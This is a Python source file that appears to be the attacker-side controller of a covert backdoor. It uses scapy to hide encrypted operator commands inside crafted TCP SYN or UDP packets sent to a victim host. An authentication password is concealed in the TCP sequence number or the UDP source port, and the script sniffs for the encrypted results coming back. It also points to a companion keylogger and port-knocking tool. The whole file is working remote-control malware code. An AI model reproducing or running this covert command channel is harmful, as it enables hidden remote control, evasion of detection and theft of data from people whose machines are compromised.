import os
from encryption import encrypt, decrypt
from scapy.all import *
from scapy.sendrecv import send
from scapy.layers.inet import IP, UDP, TCP
from scapy.packet import Raw
import config


# Set command to send to the server and encrypt it
def set_encrypt_command():
    command = input("Enter a command to send to the server: ")
    encrypted_command = encrypt(command)

    return encrypted_command


def handle_command():
    # Set command to send to esrver and encrypt it
    command = set_encrypt_command()

    # Password for authenticating packets, inserted into seq number for TCP & src port for UDP
    encrypted_password = encrypt(config.auth_password)

    if config.protocol == "tcp":
        # Craft a TCP packet and send it to server
        craft_tcp_packet(command, config.victim_ip, config.attacker_ip, config.victim_port, config.attacker_command_port, encrypted_password)
        # Start client and receive the result back from the server
        print("Waiting for results...\n")
        sniff(filter="tcp and dst host " + str(config.attacker_ip) + " and dst port " + str(config.attacker_command_port), prn=receive_tcp_command)

    if config.protocol == "udp":
        # Craft a UDP packet and send it to server
        craft_udp_packet(command, config.victim_ip, config.attacker_ip, config.victim_port, encrypted_password)
        # Start client and receive the result back from the server
        print("Waiting for results...\n")
        sniff(filter="udp and dst host " + str(config.attacker_ip) + " and dst port " + str(config.attacker_command_port), prn=receive_udp_command)


# Craft a TCP packet and send to server
def craft_tcp_packet(command, victim_ip, attacker_ip, victim_port, attacker_port, encrypted_password):
    auth_password = int.from_bytes(encrypted_password, byteorder='big')

    ip_packet = IP(dst=victim_ip, src=attacker_ip)
    tcp_packet = TCP(dport=victim_port, sport=attacker_port, flags="S") 
    crafted_packet = ip_packet / tcp_packet / command

    crafted_packet[TCP].seq = auth_password

    send(crafted_packet, verbose=False)
    print("Packet with hiddent command sent!\n")


# Craft a UDP packet and send to server
def craft_udp_packet(command, victim_ip, attacker_ip, victim_port, encrypted_password):
    auth_password = int.from_bytes(encrypted_password, byteorder='big')
    
    ip_packet = IP(dst=victim_ip, src=attacker_ip)
    udp_packet = UDP(dport=victim_port, sport=auth_password)

    crafted_packet = ip_packet / udp_packet / command
    send(crafted_packet, verbose=False)
    print("Packet with hiddent command sent!\n")


# Start client and receive the result back from the server
def receive_tcp_command(packet):
    # print(packet.summary())

    if packet.haslayer(TCP) and packet.haslayer(Raw):
        encrypted_result = packet[Raw].load

        decrypted_result = decrypt(encrypted_result)
        print("\nCommand Result: \n\n", decrypted_result)
        

# Start client and receive the result back from the server
def receive_udp_command(packet):
    # print(packet.summary())

    if packet.haslayer(UDP) and packet.haslayer(Raw):
        encrypted_result = packet[Raw].load

        decrypted_result = decrypt(encrypted_result)
        print("\nCommand Result: \n\n", decrypted_result)


# Drive the program
def main():
    if os.geteuid() != 0:
        sys.exit("Root privilege is required.")

    print("\n***For monitoring directories and accepting keylogs, please run port_knock.py.***\n")

    try:
        handle_command()
    except KeyboardInterrupt:
        sys.exit("\n\nCtrl + C detected, exiting program...\n")


if __name__ == "__main__":
    main()
